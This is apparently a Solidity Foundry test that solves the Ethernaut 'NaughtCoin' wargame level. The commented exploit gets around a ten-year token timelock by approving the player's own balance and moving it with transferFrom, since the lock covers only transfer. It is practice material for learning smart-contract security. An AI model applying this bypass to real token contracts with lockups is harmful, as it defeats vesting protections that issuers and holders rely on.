// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Our tokens are locked for 10 years and we cannot withdraw them via the contract's `transfer` function
        // because the contract is overriding the OpenZeppelin base function `transfer` adding a `lockTokens` modifier
        // that check if enough time (10 years) has passed since the timelock
        // We have two options here:
        // 1) we wait 10 years
        // 2) we find another way to transfer our token :D
        // If we look at the ERC20 from OpenZeppelin (that is an implementation of the EIP20)
        // we see that there are 2 ways to transfer tokens
        // 1) via `transfer` that allow the `msg.sender` to transfer an amount to a recipient
        // 2) via `transferFrom` that allow a `sender` to a `recipient`
        // In that function the `msg.sender` must have enough `allowance` from the `sender` to make the transfer
        // If you want to know more look at the official EIP-20 doc: https://eips.ethereum.org/EIPS/eip-20#methods
        // If you look at `NaughtCoin` they are only preventing us to transfer those coins from the `transfer` function
        // but not from `transferFrom`!

        // So to solve this challenge what we need to do is:
        // 1) have a temp account to transfer all the funds to
        // 2) give to ourself the full allowance on our balance amount (yes, it's stupid but `transferFrom` is not meant to be used to transfer our funds)
        // 3) use `transferFrom` to transfer our balance from our account to the temp one

        // Create a new users just to send some token
        address payable tempUser = utilities.getNextUserAddress();
        vm.deal(tempUser, 1 ether);

        // Approve ourself to manage all the tokens via `transferFrom`
        uint256 playerBalance = level.balanceOf(player);
        level.approve(player, playerBalance);
        level.transferFrom(player, tempUser, playerBalance);

        vm.stopPrank();

        assertEq(level.balanceOf(player), 0);
        assertEq(level.balanceOf(tempUser), playerBalance);
    }
}
